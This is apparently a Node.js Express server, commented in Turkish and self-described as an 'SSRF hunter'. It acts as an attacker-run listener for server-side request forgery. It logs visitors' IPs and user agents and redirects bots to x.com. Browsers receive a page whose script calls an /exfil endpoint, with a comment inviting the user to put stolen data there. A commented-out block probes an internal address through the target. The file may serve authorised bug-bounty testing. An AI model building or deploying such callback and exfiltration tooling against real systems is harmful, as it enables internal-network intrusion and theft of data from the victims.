const express = require('express');
const axios = require('axios'); // İç ağa istek atmak için (npm install axios)
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Loglama middleware'i
app.use((req, res, next) => {
    console.log('--- YENİ İSTEK GELDİ ---');
    console.log('Method:', req.method);
    console.log('URL:', req.url);
    console.log('User-Agent:', req.headers['user-agent']);
    console.log('IP:', req.ip || req.headers['x-forwarded-for']);
    console.log('------------------------');
    next();
});

// 1. ANA DOMAİN (Ekstra endpoint yok, direkt kök dizin)
app.get('/', async (req, res) => {
    const userAgent = req.headers['user-agent'] || '';
    
    // Eğer istek atan bir Bot / Script ise (Tarayıcı değilse) arka planda iç ağa isteği çakıp veriyi alabiliriz
    // Veya tarayıcı tabanlı SSRF ise HTML ile yönlendiririz.
    
    console.log('[!] Ana domaine istek yakalandı.');

    // Örnek: Arka planda iç ağa/metadata'ya istek atma simülasyonu (Server-Side SSRF Trigger)
    try {
        // Hedef iç ağ veya metadata adresi
        const internalTarget = 'http://[::1]';
        
        // Sunucu arka planda iç ağa istek atmayı deniyor (SSRF payload'u burada çalışır)
        // Not: Kendi sunucundan AWS metadata'ya gidemezsin ama hedef sistemin iç ağına gideceksen axios kullanabilirsin.
        /*
        const internalResponse = await axios.get(internalTarget, { timeout: 2000 });
        console.log('[+] İç ağdan veri çekildi:', internalResponse.data);
        */
    } catch (err) {
        console.log('[-] İç ağ isteği başarısız veya timeout:', err.message);
    }

    // Kullanıcıya ana sayfada x.com'a yönlendiren HTML döndür (Tarayıcılar için)
    // Botlar için ise direkt 302 ile x.com'a fırlatabilirsin.
    const isBrowser = userAgent.includes('Mozilla') || userAgent.includes('Chrome');

    if (!isBrowser) {
        // Bot ise doğrudan x.com'a yönlendir
        return res.redirect(302, 'https://x.com');
    }

    // Gerçek kullanıcı/tarayıcı ise hem x.com'a gönder hem arkada başka iş yap
    return res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta http-equiv="refresh" content="0;url=https://x.com">
            <title>Yönlendiriliyor...</title>
        </head>
        <body>
            <script>
                // Arka planda sızdırmak istediğin veriyi veya tetiklenecek isteği buraya koyabilirsin
                fetch('/exfil?data=browser_hooked');
                window.location.href = "https://x.com";
            </script>
        </body>
        </html>
    `);
});

// Veri sızdırma (Exfiltration) endpoint'i
app.get('/exfil', (req, res) => {
    console.log('[+] VERİ SIZDIRILDI (EXFIL):', req.query);
    return res.status(200).send("Data received");
});

app.listen(3000, () => console.log("SSRF Avcısı 3000 portunda devrede!"));
